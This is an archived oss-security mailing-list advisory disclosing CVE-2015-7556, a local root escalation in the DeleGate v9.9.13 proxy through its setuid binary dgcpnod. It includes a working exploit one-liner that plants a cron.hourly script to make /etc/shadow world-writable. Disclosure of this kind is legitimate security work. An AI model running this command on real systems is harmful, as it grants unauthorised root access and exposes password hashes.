X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2884" "Saturday" "26" "December" "2015" "10:46:53" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<567EB66D.80902@me.com>" "66" "[oss-security] Local root vulnerability in DeleGate v9.9.13" nil nil nil "12" "2015122615:46:53" "[oss-security] Local root vulnerability in DeleGate v9.9.13" (number mark "U       larry0@me.co Dec 26   66/2884  " thread-indent "\"[oss-security] Local root vulnerability in DeleGate v9.9.13\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11407 invoked by uid 550); 26 Dec 2015 15:47:12 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11367 invoked from network); 26 Dec 2015 15:47:06 -0000
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2015-12-26_10:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1510270003 definitions=main-1512260298
To: oss-security@lists.openwall.com
From: "Larry W. Cashdollar" <larry0@me.com>
Message-id: <567EB66D.80902@me.com>
Date: Sat, 26 Dec 2015 10:46:53 -0500
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.4.0
MIME-version: 1.0
Content-type: text/plain; charset=utf-8; format=flowed
Content-transfer-encoding: 7bit
Subject: [oss-security] Local root vulnerability in DeleGate v9.9.13

Title: Local root vulnerability in DeleGate v9.9.13
Author: Larry W. Cashdollar, @_larry0
Date: 2015-12-17
Advisory: http://www.vapidlabs.com/advisory.php?v=159
Download Sites: http://delegate.hpcc.jp/delegate/ 
http://delegate.org/delegate/
Vendor: National Institute of Advanced Industrial Science and Technology
Vendor Notified: 2015-12-17
Vendor Contact: y.sato@delegate.org ysato@etl.go.jp
Description: DeleGate is a multipurpose proxy server which relays 
various application protocols on TCP/IP or UDP/IP, including HTTP, FTP, 
Telnet, NNTP, SMTP, POP, IMAP, LPR, LDAP, ICP, DNS, SSL, Socks, and 
more. DeleGate mediates communication between servers and clients where 
direct communication is impossible, inefficient, or inconvenient.

Vulnerability:
Installation of delegate 9.9.13 sets some binaries setuid root, at least 
one of these binaries can be used to escalate the privileges of a local 
user.  The binary dgcpnod creates a node allowing a local unprivileged 
user to create files anywhere on disk.   By creating a file in 
/etc/cron.hourly a local user can execute commands as root.

Installation of software via source or binary distribution with option 
to not run as root results in a script set-subin.sh to run setting the 
setuid bit on four binaries.  In Linux distributions where this software 
is part of the package list these binaries are not setuid root. (archlinux)

 From documentation http://www.delegate.org/delegate/newbies-ja.shtml 
(translated to english):
Go is included in the binary distribution, or DGROOT that you can build 
from the source to the location of preference, and then change the name 
if necessary. This is the DgRoot. In addition, if needed, you can rename 
the executable file of DeleGate to the name of the preference. This is 
the DgExe.
"In Unix version subin in if you want to use "(such as when using a 
privileged port), do the following.

   (3-2uk) $ cd DgRoot / subin
           $ Sh setup-subin.sh

larry@f4ult:~/dg9_9_13/DGROOT/subin$ ls -l
total 1916
-r-sr-s--- 1 root  larry 384114 Oct 31  2014 dgbind
-r-sr-s--- 1 root  larry 384598 Oct 31  2014 dgchroot
-r-sr-s--- 1 root  larry 384161 Oct 31  2014 dgcpnod
-rwxr-xr-x 1 larry larry 384114 Oct 31  2014 dgdate
-rwxr-xr-x 1 larry larry  29066 Oct 31  2014 dgforkpty
-r-sr-s--- 1 root  larry 384113 Oct 31  2014 dgpam
-rwxr-x--- 1 larry larry    272 Oct 27  2014 setup-subin.sh

This script sets the setuid bit on four binaries:

larry@f4ult:~/dg9_9_13/DGROOT/subin$ cat setup-subin.sh
#!/bin/sh

SUBINS="dgpam dgbind dgchroot dgcpnod"
sudo sh -c "chown root $SUBINS; chmod 6550 $SUBINS"
if [ $? != 0 ]; then
   su root -c "chown root $SUBINS; chmod 6550 $SUBINS"
fi
CVEID: 2015-7556
Exploit Code:
$ touch /tmp/rootme; chmod +x /tmp/rootme; ./dgcpnod /tmp/rootme 
/etc/cron.hourly/rootme; echo -e '#!/bin/bash \n chmod 777 /etc/shadow' 
 > /etc/cron.hourly/rootme

